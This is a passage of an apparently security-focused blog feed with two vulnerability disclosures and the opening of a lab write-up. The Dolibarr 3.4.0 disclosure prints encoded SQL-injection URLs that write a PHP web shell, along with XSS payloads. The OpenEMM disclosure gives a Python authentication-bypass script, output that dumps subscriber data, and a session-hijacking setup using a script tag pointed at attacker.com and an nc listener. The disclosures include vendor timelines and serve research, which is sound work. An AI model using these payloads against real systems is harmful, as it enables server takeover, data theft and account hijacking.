+</span><span class='line'>        $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."societe as s ON c.fk_soc = s.rowid";
+</span><span class='line'>        $sql.= " WHERE c.rowid = ". $id;
+</span><span class='line'>
+</span><span class='line'>        dol_syslog(get_class($this)."::fetch sql=".$sql);
+</span><span class='line'>        $resql=$this-&gt;db-&gt;query($sql);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Our vulnerable parameter <code>id</code> is sanitized only by the previously described functions.  There are now two main options; dump information from the database, or drop a web shell onto the host.  The latter is the best case and the former is, usually, a good consolatory prize.  However, in this case, the database is ripe with information, specifically:</p>
+
+<p><img class="center" src="http://4.bp.blogspot.com/-2tO85Ih1O2s/UlEbzsgAAWI/AAAAAAAAAts/VlnnOIbHPQM/s1600/wow_db.JPG"></p>
+
+<p>Yeah, that&rsquo;s your plaintext password stored right next to the hashed version.  Dumping the database just got a whole lot more interesting.</p>
+
+<p>Our attention now turns to evading the filters listed above.  For obtaining a shell, the only evasion we need to consider is UNION SELECT, as INTO OUTFILE/DUMPFILE is not filtered.  After a bit of deliberation and source code analysis, it was determined that the filters were trivially bypassed by URL encoding SQL keywords.  The following query will drop a web shell at the given location:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://localhost/dolibarr-3.4.0/htdocs/contact/fiche.php?id=1%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20'&lt;?php%20system($_GET[\'cmd\'])?&gt;',1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35%20INTO%20OUTFILE%20'/var/www/dolibarr-3.4.0/documents/shell.php'&action=confirm_delete&confirm=yes HTTP/1.1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Which results in:</p>
+
+<p><img class="center" src="http://1.bp.blogspot.com/-1fdpL601fvY/UlHJRh5Us-I/AAAAAAAAAt8/JKKRGytyNjQ/s640/web_shell.JPG" title="" ></p>
+
+<p>The documents folder is a perfect candidate for our web shell as, during installation of the CMS, this folder must be user-created and writable by the install, giving us a guaranteed and predictable location for the web shell.</p>
+
+<p>This vulnerability has been detected in <code>contact.class.php</code> in four different functions: fetch, update, delete, and create.</p>
+
+<p>We now take another look at the XSS filtering function:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>  // For XSS Injection done by adding javascript with script
+</span><span class='line'>    // This is all cases a browser consider text is javascript:
+</span><span class='line'>    // When it found '&lt;script', 'javascript:', '&lt;style', 'onload\s=' on body tag, '="&' on a tag size with old browsers
+</span><span class='line'>    // All examples on page: http://ha.ckers.org/xss.html#XSScalc
+</span><span class='line'>    $sql_inj += preg_match('/&lt;script/i', $val);
+</span><span class='line'>    if (! defined('NOSTYLECHECK')) $sql_inj += preg_match('/&lt;style/i', $val);
+</span><span class='line'>    $sql_inj += preg_match('/base[\s]+href/i', $val);
+</span><span class='line'>    if ($type == 1)
+</span><span class='line'>    {
+</span><span class='line'>        $sql_inj += preg_match('/javascript:/i', $val);
+</span><span class='line'>        $sql_inj += preg_match('/vbscript:/i', $val);
+</span><span class='line'>    }
+</span><span class='line'>    // For XSS Injection done by adding javascript closing html tags like with onmousemove, etc... (closing a src or href tag with not cleaned param)
+</span><span class='line'>    if ($type == 1) $sql_inj += preg_match('/"/i', $val);          // We refused " in GET parameters value
+</span><span class='line'>    if ($type == 2) $sql_inj += preg_match('/[\s;"]/', $val);     // PHP_SELF is an url and must match url syntax
+</span><span class='line'>    return $sql_inj;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As we can see, this is quite weak, and we can get by with a very simple injection, <code>&lt;body onload=alert(1)&gt;</code>.  Injecting this into the last name of a contact results in success:</p>
+
+<p><img class="center" src="http://4.bp.blogspot.com/-FD3FnWu2bAg/UlHXEtGDaTI/AAAAAAAAAuM/RZ8Cr2wHiE4/s1600/xss2.JPG"></p>
+
+<p>With this we can syphon off session IDs and completely hijack sessions.  Any field that&rsquo;s reflected back to the user is vulnerable, and considering this is a CMS, that&rsquo;s a lot.</p>
+
+<p>All of the discussed vulnerabilities have, thus far, been post-auth.  One remotely exploitable pre-auth vulnerability was discovered in <code>public/members/public_list.php</code> (configured with <code>define("NOLOGIN",1)</code>), meaning it does not require auth):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$sortfield = GETPOST("sortfield",'alpha');
+</span><span class='line'>$sortorder = GETPOST("sortorder",'alpha');
+</span><span class='line'>$page = GETPOST("page",'int');
+</span><span class='line'>if ($page == -1) { $page = 0; }
+</span><span class='line'>$offset = $conf-&gt;liste_limit * $page;
+</span><span class='line'>$pageprev = $page - 1;
+</span><span class='line'>$pagenext = $page + 1;
+</span><span class='line'>
+</span><span class='line'>$filter=GETPOST('filter');
+</span><span class='line'>$statut=GETPOST('statut');
+</span><span class='line'>
+</span><span class='line'>if (! $sortorder) {  $sortorder="ASC"; }
+</span><span class='line'>if (! $sortfield) {  $sortfield="nom"; }
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>/*
+</span><span class='line'> * View
+</span><span class='line'> */
+</span><span class='line'>
+</span><span class='line'>llxHeaderVierge($langs-&gt;trans("ListOfValidatedPublicMembers"));
+</span><span class='line'>
+</span><span class='line'>$sql = "SELECT rowid, firstname, lastname, societe, zip, town, email, birth, photo";
+</span><span class='line'>$sql.= " FROM ".MAIN_DB_PREFIX."adherent";
+</span><span class='line'>$sql.= " WHERE entity = ".$entity;
+</span><span class='line'>$sql.= " AND statut = 1";
+</span><span class='line'>$sql.= " AND public = 1";
+</span><span class='line'>$sql.= $db-&gt;order($sortfield,$sortorder);
+</span><span class='line'>$sql.= $db-&gt;plimit($conf-&gt;liste_limit+1, $offset);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And <code>core/db/msqli.class.php</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> function order($sortfield=0,$sortorder=0)
+</span><span class='line'>    {
+</span><span class='line'>        if ($sortfield)
+</span><span class='line'>        {
+</span><span class='line'>            $return='';
+</span><span class='line'>            $fields=explode(',',$sortfield);
+</span><span class='line'>            foreach($fields as $val)
+</span><span class='line'>            {
+</span><span class='line'>                if (! $return) $return.=' ORDER BY ';
+</span><span class='line'>                else $return.=',';
+</span><span class='line'>
+</span><span class='line'>                $return.=preg_replace('/[^0-9a-z_\.]/i','',$val);
+</span><span class='line'>                if ($sortorder) $return.=' '.preg_replace('/[^0-9a-z]/i','',$sortorder);
+</span><span class='line'>            }
+</span><span class='line'>            return $return;
+</span><span class='line'>        }
+</span><span class='line'>        else
+</span><span class='line'>        {
+</span><span class='line'>            return '';
+</span><span class='line'>        }
+</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And navigation to the page results in:</p>
+
+<p><img class="center" src="http://3.bp.blogspot.com/-jr_PuLchQdA/UlHbsoCHgpI/AAAAAAAAAuY/a-EKEX_ZqKU/s640/preauth_injection.JPG"></p>
+
+<p>As shown, the <code>sortfield</code> and <code>sortorder</code> parameters are inadequately sanitized, but exploitation may be a bit tricky.  The order function strips everything that isn&rsquo;t a number, lowercase alphanumeric letter, or one of three symbols.  Instead, why don&rsquo;t we exploit yet <em>another</em> preauth vulnerability in <code>opensurvey/public/exportcsv.php</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$action=GETPOST('action');
+</span><span class='line'>$numsondage = $numsondageadmin = '';
+</span><span class='line'>
+</span><span class='line'>if (GETPOST('sondage'))
+</span><span class='line'>{
+</span><span class='line'>    if (strlen(GETPOST('sondage')) == 24)    // recuperation du numero de sondage admin (24 car.) dans l'URL
+</span><span class='line'>    {
+</span><span class='line'>        $numsondageadmin=GETPOST("sondage",'alpha');
+</span><span class='line'>        $numsondage=substr($numsondageadmin, 0, 16);
+</span><span class='line'>    }
+</span><span class='line'>    else
+</span><span class='line'>    {
+</span><span class='line'>        $numsondageadmin='';
+</span><span class='line'>        $numsondage=GETPOST("sondage",'alpha');
+</span><span class='line'>    }
+</span><span class='line'>}
+</span><span class='line'>
+</span><span class='line'>$object=new Opensurveysondage($db);
+</span><span class='line'>$result=$object-&gt;fetch(0,$numsondage);
+</span><span class='line'>if ($result &lt;= 0) dol_print_error('','Failed to get survey id '.$numsondage);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And <code>opensurvey/class/opensurveysondage.class.php</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>function fetch($id,$numsurvey='')
+</span><span class='line'>{
+</span><span class='line'>global $langs;
+</span><span class='line'>
+</span><span class='line'>$sql = "SELECT";
+</span><span class='line'>//$sql.= " t.rowid,";
+</span><span class='line'>$sql.= " t.id_sondage,";
+</span><span class='line'>$sql.= " t.commentaires,";
+</span><span class='line'>$sql.= " t.mail_admin,";
+</span><span class='line'>$sql.= " t.nom_admin,";
+</span><span class='line'>$sql.= " t.titre,";
+</span><span class='line'>$sql.= " t.id_sondage_admin,";
+</span><span class='line'>$sql.= " t.date_fin,";
+</span><span class='line'>$sql.= " t.format,";
+</span><span class='line'>$sql.= " t.mailsonde,";
+</span><span class='line'>$sql.= " t.survey_link_visible,";
+</span><span class='line'>$sql.= " t.canedit,";
+</span><span class='line'>$sql.= " t.sujet,";
+</span><span class='line'>$sql.= " t.tms";
+</span><span class='line'>$sql.= " FROM ".MAIN_DB_PREFIX."opensurvey_sondage as t";
+</span><span class='line'>if ($id &gt; 0) $sql.= " WHERE t.rowid = ".$id;
+</span><span class='line'>else if (strlen($numsurvey) == 16) $sql.= " WHERE t.id_sondage = '".$numsurvey."'";
+</span><span class='line'>else $sql.= " WHERE t.id_sondage_admin = '".$numsurvey."'";
+</span><span class='line'>
+</span><span class='line'>dol_syslog(get_class($this)."::fetch sql=".$sql, LOG_DEBUG);
+</span><span class='line'>$resql=$this-&gt;db-&gt;query($sql);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As the bolded path shows, the query argument <code>numsurvey</code> is directly controllable by an unauthenticated user, leading to the same type of SQL vulnerability shown earlier.  This can be exploited with the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>GET /dolibarr/htdocs/opensurvey/public/exportcsv.php?sondage='%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20'&lt;?php%20system($_GET[\'cmd\'])?&gt;',2,3,4,5,6,7,8,9,10,11,12,13%20INTO%20OUTFILE%20'/var/www/dolibarr-3.4.0/documents/shell.php';%20--%20-%20 HTTP/1.1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Using the same URL encoding trick from before, we can bypass the blacklisting and inject directly into the vulnerable query.  Exploit code for this is included at the bottom of the post:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# python dolibarr_34_sploit.py -i 192.168.1.100 -p /dolibarr-3.4.0 -w /var/www/dolibarr-3.4.0/documents
+</span><span class='line'>[!] Dropping web shell on 192.168.1.100...
+</span><span class='line'>[!] Shell dropped.  http://192.168.1.100/documents/o4oct.php?cmd=ls
+</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="center" src="http://4.bp.blogspot.com/-zzy2s3woupU/UlICbKycNVI/AAAAAAAAAuo/Qauz6R-GQjo/s640/shell_thing.JPG"></p>
+
+<p>Fortunately, for users running DoliWamp,  Dolibarr + WAMP package on Windows, the default user that the database runs with is not allowed to write files.  They are still vulnerable, however, to database corruption and traversal (i.e. drop table subqueries, etc.).</p>
+
+<h3>Timeline</h3>
+
+
+<ul>
+<li>10/06/2013 &ndash; Vendor notified of remotely exploitable vulnerabilities</li>
+<li>10/07/2013 &ndash; Vendor acknowledges vulnerability, no timeline provided</li>
+<li>10/11/2013 &ndash; Vendor states fix will be in the 3.4.1 release within the month</li>
+<li>10/14/2013 &ndash; 3.4.1 released with patch.  This advisory released</li>
+</ul>
+
+
+<p><a href="http://www.exploit-db.com/exploits/28971/">Exploit</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[OpenEMM-2013 SOAP SQLi/Stored XSS]]></title>
+    <link href="http://hatRiot.github.io/blog/2013/07/28/openemm-2013-soap-sqli-slash-stored-xss/"/>
+    <updated>2013-07-28T23:24:15-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2013/07/28/openemm-2013-soap-sqli-slash-stored-xss</id>
+    <content type="html"><![CDATA[<p><a href="http://www.openemm.org/">OpenEMM</a> is one of the most popular enterprise-grade email marketing software currently on the market; the best part of it, too, is that it&rsquo;s free and open source.  The entire stack is java, with some random shell/Python scripts for configuration.  On inspection of the software, it appeared there were several SQL injection vulnerabilities due in part to a lack of input sanitation.  This vulnerability was privately disclosed to the vendor, and a patch will be released shortly and backported to OpenEMM 2013 and 2011.</p>
+
+<p>Paramaterized queries are not used consistently throughout the application; there are instances of paramterized queries, queries with basic sanitization, and queries without sanitization at all.  SQL queries are sanitized with the following function (SafeString.java):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>  /**
+</span><span class='line'>     * Gets the SQL string.
+</span><span class='line'>     */
+</span><span class='line'>    public static String getSQLSafeString(String input) {
+</span><span class='line'>        if (input == null) {
+</span><span class='line'>            return " ";
+</span><span class='line'>        } else {
+</span><span class='line'>            return input.replace("'", "''");
+</span><span class='line'>        }
+</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<p>This function inadequately sanitizes input.  The following malicious input would successfully slip through:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>\' AND UNION SELECT 1,2,3;-- </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Which, when inserted into an example query <code>SELECT * FROM admin WHERE username = '$user';</code> becomes
+<code>SELECT * FROM admin WHERE username = '\'' AND UNION SELECT 1,2,3;-- ';</code></p>
+
+<p>This sanitation function is used throughout OpenEMM, and any OpenEMM server exposing WSDL, or Web Services Description Language, is vulnerable.  A default OpenEMM installation exposes a handful of useful functions that allow a remote application/user access to various tables in the database.  Each function requires authentication, which runs through the following routine (WebServiceBase.java):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>protected boolean authenticateUser(MessageContext msct, String user, String pwd, int companyID) {
+</span><span class='line'>        boolean result=false;
+</span><span class='line'>        Connection dbConn=this.getConnection(msct);
+</span><span class='line'>        Statement agnStatement=null;
+</span><span class='line'>        ResultSet rset=null;
+</span><span class='line'>        
+</span><span class='line'>        try {
+</span><span class='line'>            agnStatement=dbConn.createStatement();
+</span><span class='line'>            rset=agnStatement.executeQuery("select a.ws_admin_id from ws_admin_tbl a where a.username='"+SafeString.getSQLSafeString(user)+"' and a.password='"+SafeString.getSQLSafeString(pwd)+"'");
+</span><span class='line'>            if(rset!=null && rset.next()) {
+</span><span class='line'>                result=true;
+</span><span class='line'>            } else {
+</span><span class='line'>                result=false;
+</span><span class='line'>                HttpServletRequest req=(HttpServletRequest)msct.getProperty("transport.http.servletRequest");
+</span><span class='line'>                log.info(req.getRemoteAddr()+" -0-l: login failed: "+user+" "+companyID);
+</span><span class='line'>            }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As shown, the vulnerable <code>getSQLSafeString</code> method is used in an attempt to sanitize input before building and executing the query.  This leads to a very trivial authentication bypass vulnerability, allowing any malicious user access to every WSDL function (found at <code>http://yourhost.com/emm_webservices</code>).</p>
+
+<p>The following code will bypass SOAP authentication and add a new mailing list:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>from SOAPpy import WSDL
+</span><span class='line'>
+</span><span class='line'>wsdl_file = "./ws.wsdl"
+</span><span class='line'>sploit = "\\' OR 1=1;-- "
+</span><span class='line'>
+</span><span class='line'>_server = WSDL.Proxy(wsdl_file)
+</span><span class='line'>ret = _server.addMailinglist("wsadmin", sploit, "w00t", "w00t")
+</span><span class='line'>if ret &gt; 0:
+</span><span class='line'>    print 'success (%d)'%ret</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This requires a very basic WSDL file, which is included with an OpenEMM installation as well as the bottom of this post.  I&rsquo;ve included exploit code that exploits several of these functions:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# python openemm_wsdl.py -h
+</span><span class='line'>usage: openemm_wsdl.py [-h] -i HOST [-s] [-m MLIST] [--dm] [--ds]
+</span><span class='line'>
+</span><span class='line'>optional arguments:
+</span><span class='line'>  -h, --help  show this help message and exit
+</span><span class='line'>  -i HOST     server address
+</span><span class='line'>  -s          fetch all subscribers
+</span><span class='line'>  -m MLIST    create new mailing list (XSS)
+</span><span class='line'>  --dm        delete all mailing lists
+</span><span class='line'>  --ds        delete all subscribers
+</span><span class='line'>root@jali:~/exploits# python openemm_wsdl.py -i 192.168.1.83 -s
+</span><span class='line'>&lt;SOAPpy.Types.structType multiRef at 30449464&gt;: {'x': ['2013', '2013-06-29 17:54:02', 'Last', 'First', '2', '29', '0', '17', '2013', '2013-06-29 17:54:02', '', '1', '54', '6', 'first.last@domain.org', '2', '6', '29', '54', '0', '17', '1']}
+</span><span class='line'>&lt;SOAPpy.Types.structType multiRef at 30446728&gt;: {'x': ['2013', '2013-06-29 17:54:02', 'Name', 'No', '2', '29', '0', '17', '2013', '2013-06-29 17:54:02', '', '1', '54', '6', 'no.name@yourdomain.com', '2', '6', '29', '54', '0', '17', '2']}
+</span><span class='line'>[!] Discovered 2 subscribers
+</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Our &ldquo;end goal&rdquo; for this exploit is, however, not just adding mailing lists or deleting content; we&rsquo;d like to obtain a web shell.  As OpenEMM is written in Java (struts), Java Server Pages (JSP) are invoked server-side to render client-side pages.  Theoretically, we should be able to dump a malicious JSP file into a readable/writable directory and obtain a remote shell.</p>
+
+<p>Unfortunately (fortunately for users/OpenEMM, though), the user used to connect to the MySQL database does not have FILE permissions:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; select user();
+</span><span class='line'>+-------------------+
+</span><span class='line'>| user()            |
+</span><span class='line'>+-------------------+
+</span><span class='line'>| agnitas@localhost |
+</span><span class='line'>+-------------------+
+</span><span class='line'>1 row in set (0.00 sec)
+</span><span class='line'>
+</span><span class='line'>mysql&gt; show grants;
+</span><span class='line'>+----------------------------------------------------------------------------------------------------------------------------------------------------+
+</span><span class='line'>| Grants for agnitas@localhost                                                                                                                       |
+</span><span class='line'>+----------------------------------------------------------------------------------------------------------------------------------------------------+
+</span><span class='line'>| GRANT USAGE ON *.* TO 'agnitas'@'localhost' IDENTIFIED BY PASSWORD '*BC428C4FAA04992D1E8CF04545DD70FA60E588C5'                                     |
+</span><span class='line'>| GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, INDEX, ALTER, CREATE TEMPORARY TABLES, LOCK TABLES ON `openemm`.* TO 'agnitas'@'localhost'     |
+</span><span class='line'>| GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, INDEX, ALTER, CREATE TEMPORARY TABLES, LOCK TABLES ON `openemm_cms`.* TO 'agnitas'@'localhost' |
+</span><span class='line'>+----------------------------------------------------------------------------------------------------------------------------------------------------+
+</span><span class='line'>3 rows in set (0.00 sec)
+</span><span class='line'>
+</span><span class='line'>mysql&gt; </span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is the user specified by <code>webapps/openemm/WEB-INF/classes/emm.properties</code>.  As shown, we have only basic access to the databases.  In the event that this user and permissions are modified, it is possible to upload a web shell, but in its default state, you cannot.</p>
+
+<p>From this SQL injection, then, we have authentication bypass and information disclosure.  Because this interface inserts data directly into databases, and does not go through a unified channel (i.e. for their basic sanitation methods), several fields are vulnerable to XSS, including a new mailing list&rsquo;s Description field:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# python openemm_wsdl.py -i 192.168.1.83 -m w00t
+</span><span class='line'>[!] Description field vulnerable to stored xss!
+</span><span class='line'>[!] Enter mlist description: &lt;script&gt;alert('XSS!')&lt;/script&gt;
+</span><span class='line'>[!] Saved successfully
+</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="center" src="http://2.bp.blogspot.com/-lYlTr36HnSM/Uer_nBvALcI/AAAAAAAAAhY/vtunAxjrjfs/s640/xss.jpg"></p>
+
+<p>With this, we can siphon off session ID&rsquo;s by simply injecting <code>&lt;script src="http://attacker.com"/&gt;</code>.  We do not need to send document.cookie because, surprise, session ID&rsquo;s are not stored as a cookie, but rather passed around through each GET/POST request.  Therefore, the Referrer header will contain the jsessionid required to hijack the session.  Our hijacked request looks as such:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# nc -l -p 80
+</span><span class='line'>GET / HTTP/1.1
+</span><span class='line'>Host: 192.168.1.147
+</span><span class='line'>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0
+</span><span class='line'>Accept: */*
+</span><span class='line'>Accept-Language: en-US,en;q=0.5
+</span><span class='line'>Accept-Encoding: gzip, deflate
+</span><span class='line'>DNT: 1
+</span><span class='line'>Referer: http://192.168.1.83:8080/mailinglist.do;jsessionid=CBD95DD7B9B1ABF9C8922BC2DC5047E3?action=1
+</span><span class='line'>Connection: keep-alive
+</span><span class='line'>
+</span><span class='line'>^C
+</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>
+
+
+<p>We then simply make the same request in the Referrer field and we&rsquo;ve got access to the account.</p>
+
+<p><a href="http://pastebin.com/JLh7BYYj">Exploit</a><br/>
+<a href="http://pastebin.com/GXdw3FcQ">wsdl</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[solving RA1NXing Bots]]></title>
+    <link href="http://hatRiot.github.io/blog/2013/07/10/solving-ra1nxing-bots/"/>
+    <updated>2013-07-10T23:31:29-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2013/07/10/solving-ra1nxing-bots</id>
+    <content type="html"><![CDATA[<p><a href="http://vulnhub.com/entry/ra1nxing-bots_1,52/">RA1NXing Bots</a> is a vulnerable image intended to jump start security researches&#8217; interest in botnets and their exploitability.  This vulnerable image was brought to us by Brian Wallace (<a href="https://twitter.com/botnet_hunter">@botnet_hunter</a>), a botnet security researcher at Cylance and good friend (and Ballast Security co-founder).  This was a pretty interesting  vulnerable image, and good exposure into the sometimes seedy and malevolent world of botnets.</p>
+
+<p>As such, the iconic nmap:</p>
